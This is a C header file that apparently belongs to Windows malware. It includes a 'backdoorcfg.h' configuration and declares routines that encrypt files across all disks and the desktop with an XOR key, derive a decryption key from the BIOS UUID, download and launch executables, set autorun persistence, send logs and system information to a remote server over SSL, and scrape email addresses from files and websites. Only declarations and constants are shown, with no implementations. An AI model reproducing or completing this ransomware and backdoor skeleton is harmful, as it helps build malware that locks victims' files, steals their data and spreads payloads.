#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include "openssl/bio.h"
#include "openssl/ssl.h"
#include "openssl/err.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winINet.h>
#include "shlwapi.h"
#include "Shellapi.h"
#include <time.h>
#include <process.h>
#include "Shlobj.h"
#include "regex.h"
#include <Wincrypt.h>

#include "backdoorcfg.h"


#pragma comment(lib,"libeay.lib")
#pragma comment(lib,"ssleay32.lib")

#pragma comment (lib, "Crypt32.lib")
#pragma comment(lib,"regex.lib")
#pragma comment(lib, "shlwapi.lib") 
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "winINet.lib")



//#define LOG_SERVER_PORT "27016"
#define NET_SEND_BUFLEN 512
#define MAX_PATH_Y 300
#define XORENCRY_KEY 0xE555E5BF
#define ENCRYPTION_XOR 3
#define DECRYPTION_XOR 4



typedef DWORD(WINAPI *PENCRYPTION_ROUTINE)(LPCTSTR infile);
typedef struct _server_name_post {
	char* server_name;
	char* server_port;
} SERVER_INFO;

DWORD LaunchExe(LPTSTR szUnicExeName);
DWORD DownLoadFile(LPTSTR lpUrl,LPTSTR lpFilePath);
DWORD FindFilesRecursively(LPCTSTR lpFolder, LPCTSTR lpFilePattern, PENCRYPTION_ROUTINE routine);
DWORD EncryptFiles(LPCTSTR dir, DWORD dwFlag);
VOID Console();
VOID EventLogs(LPCTSTR);
VOID ReportSysInfo();
DWORD InitLogs();
DWORD CloseLogs();
DWORD SendLogFileToServer();
DWORD GetBIOS_UUID(LPTSTR buff, DWORD size);
VOID URL_cryptTest();
DWORD XORcrypt(unsigned char* org, int isize, char *out);
DWORD GetLocalTime_ye(TCHAR* fmtTime);
DWORD GetUnicDecrKey(unsigned char* enc, DWORD isiz,LPTSTR out,DWORD osiz);
DWORD WINAPI XORDecrypt(PCTSTR ifile);
DWORD WINAPI XOREncrypt(PCTSTR ifile);
VOID FullDisksCrypt(DWORD dwFlag);
DWORD SetAutoRunApp(LPCTSTR apppath);
VOID DesktopCrypt(DWORD dwFlag);
DWORD uninstall();




DWORD IsStrExistingInFile(HANDLE hfile, char* str);
DWORD FileRegexMatching(HANDLE hIn, HANDLE hOut,const char* pattern);
DWORD WebRegexMatching(HANDLE hOut, LPTSTR lpUrl,const char* pattern);
DWORD RemoveDulpicLine(HANDLE hfile);
DWORD RegMatchingByUrlFile(HANDLE hsitefile, HANDLE hemailfile, const char* pattern);
DWORD RegClassifyToFile(HANDLE ifile, HANDLE ofile, char* pattern);
int FromBase64Crypto(const BYTE* pSrc, int nLenSrc, char* pDst, int nLenDst);
int ToBase64Crypto(const BYTE* pSrc, int nLenSrc, char* pDst, int nLenDst);
DWORD initOpenSSL_ye(SERVER_INFO* serv, BIO** pbio, SSL_CTX** pssl_ctx);
DWORD freeOpenSSL_ye(BIO* bio, SSL_CTX* ssl_ctx);

typedef    unsigned(__stdcall    *PTHREAD_START)    (void *);
#define    chBEGINTHREADEX(psa, cbStack, pfnStartAddr,    \
	pvParam, fdwCreate, pdwThreadId)                    \
	((HANDLE)_beginthreadex(\
	(void *)(psa), \
	(unsigned)(cbStack), \
	(PTHREAD_START)(pfnStartAddr), \
	(void *)(pvParam), \
	(unsigned)(fdwCreate), \
	(unsigned *)(pdwThreadId)))


